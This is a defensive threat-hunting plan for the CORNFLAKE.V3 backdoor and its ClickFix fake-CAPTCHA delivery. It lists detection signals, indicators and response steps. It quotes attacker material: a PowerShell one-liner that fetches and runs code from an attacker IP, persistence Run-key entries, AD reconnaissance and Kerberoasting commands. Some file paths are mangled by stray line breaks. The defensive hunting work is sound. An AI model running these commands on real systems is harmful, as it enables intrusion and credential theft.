# Threat Hunting Hypothesis: CORNFLAKE.V3 Backdoor

## Source
- **Threat Intelligence:** [Google Cloud Threat Intelligence: A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor](https://cloud.google.com/blog/topics/threat-intelligence/analyzing-cornflake-v3-backdoor)
- **Date:** August 2025

## Purpose
Guide a focused hunt to identify and contain CORNFLAKE.V3 backdoor activity and associated access-as-a-service initial access provided by UNC5518, as described by Mandiant in Google Cloud Threat Intelligence (Aug 20, 2025).

## Hypothesis Statement
If our environment has users who encountered “ClickFix” fake CAPTCHA pages (UNC5518) and executed a copied PowerShell command via Windows+R, then one or more endpoints may have downloaded Node.js or PHP runtimes into %APPDATA%, executed an unobfuscated CORNFLAKE.V3 backdoor (Node.js or PHP variant) attributed to UNC5774, established persistence via an HKCU Run key (e.g., ChromeUpdater or random appdata-dir name), performed host/AD reconnaissance, and attempted Kerberoasting - with C2 over HTTP to hardcoded hosts or via Cloudflare Tunnels.

## Rationale (Threat Intel)
- Initial access: ClickFix lures delivered by UNC5518 copy a PowerShell one-liner to clipboard and instruct users to run it via Windows+R (RunMRU evidence). The script fetches a dropper from 138.199.161[.]141:8080/<epoch>.
- Execution: Dropper downloads and unpacks Node.js (or PHP) into %APPDATA% and launches CORNFLAKE.V3 (Node: node.exe -e <script>; PHP: php.exe -d … config.cfg 1).
- Backdoor capabilities: HTTP C2 (XOR-encoded), payload execution types (EXE, DLL via rundll32, JS in-memory, CMD), persistence via HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Observed recon and Kerberoasting.
- Infrastructure and variations: C2 examples 159.69.3[.]151; PHP variant uses trycloudflare tunnels and stealthy file extensions (.png/.jpg for DLL/JS), Node/PHP distribution from nodejs.org/windows.php.net.

## Scope and Key Questions
- Which endpoints show PowerShell launching node.exe or php.exe from %APPDATA% with characteristic arguments?
- Are there new HKCU Run keys referencing node.exe or php.exe paths in %APPDATA% (e.g., “ChromeUpdater” or random names)?
- Do any hosts exhibit subsequent recon (systeminfo, tasklist /svc, arp -a, Get-Service, Get-PSDrive, nltest, setspn) or Kerberoasting artifacts?
- Are there unusual connections from PowerShell/mshta to nodejs.org/windows.php.net or C2/Cloudflare Tunnel endpoints following a ClickFix event?

## Testable Signals and Hunt Procedures
1) Process Execution (Node.js variant)
- Look for PowerShell spawning %APPDATA%\…
ode.exe with -e and hidden window:
  - parent: powershell.exe
  - child: %APPDATA%\Roaming
ode-v*.win-x64
ode.exe -e "<large JS>"
- Correlate with cmd.exe/powershell.exe child processes from node.exe.

2) Process Execution (PHP variant)
- Look for PowerShell spawning %APPDATA%\…\php.exe with “-d” flags and a non-.php script (config.cfg) and trailing " 1":
  - child: %APPDATA%\Roaming\php\php.exe -d extension=zip -d extension_dir=ext <path>\config.cfg 1

3) Persistence (Run keys)
- Registry HKCU\Software\Microsoft\Windows\CurrentVersion\Run entries:
  - Name: ChromeUpdater -> Data: "<path>
ode.exe" "<script_path or -e>"
  - Name: <random appdata dirname> -> Data: "<path>\php.exe" … config.cfg 1

4) Clipboard/RunMRU Artifacts (ClickFix)
- HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU entries containing PowerShell one-liners like:
  - irm 138.199.161[.]141:8080/<epoch> | iex
- Suspicious clipboard interactions around the time of the event.

5) Reconnaissance and Kerberoasting
- Commands observed soon after node/php execution:
  - systeminfo, tasklist /svc, Get-Service, Get-PSDrive, arp -a
  - AD recon: whoami /all, nltest /domain_trusts, nltest /dclist, setspn -T <domain> -Q */*
  - Kerberoasting PS script calling System.IdentityModel.Tokens.KerberosRequestorSecurityToken

6) Network
- Outbound to:
  - nodejs.org or windows.php.net immediately prior to node/php execution
  - C2: 159.69.3[.]151 (HTTP), and Cloudflare Tunnel hostnames like varying-rentals-calgary-predict.trycloudflare[.]com
  - Historical: 138.199.161[.]141:8080 (dropper)

## Data Sources
- EDR/Process telemetry (parent-child chains, command-lines)
- Registry auditing (HKCU Run, RunMRU)
- PowerShell logs (Module, Script Block, Transcription)
- Windows Security/Operational logs (Sysmon if available)
- DNS/Proxy/Firewall logs (nodejs.org, windows.php.net, trycloudflare domains, listed IPs)

## Decision Criteria
- Confirmed: Any endpoint with the triad of (a) %APPDATA% node.exe/php.exe execution per above, (b) matching HKCU Run persistence, and (c) recon/Kerberoasting activity or C2 contact.
- Probable: Two of the three, plus corroborating network to distribution sites or Cloudflare Tunnel C2.
- Benign/False Positive: Developer-installed Node/PHP in %APPDATA% with no Run key persistence, no suspicious child processes, and no C2/recon events.

## Immediate Response Actions (if positive)
- Isolate affected hosts; collect volatile artifacts (process list, network connections, RAM if feasible).
- Preserve and export Run keys and relevant PowerShell history.
- Block indicators (hosts/IPs/domains) at egress; sinkhole if available.
- Rotate potentially exposed service account credentials; review Kerberos ticket usage; expedite password resets where hashes may be exposed.
- Hunt laterally for WINDYTWIST.SEA or follow-on payloads executed via rundll32.

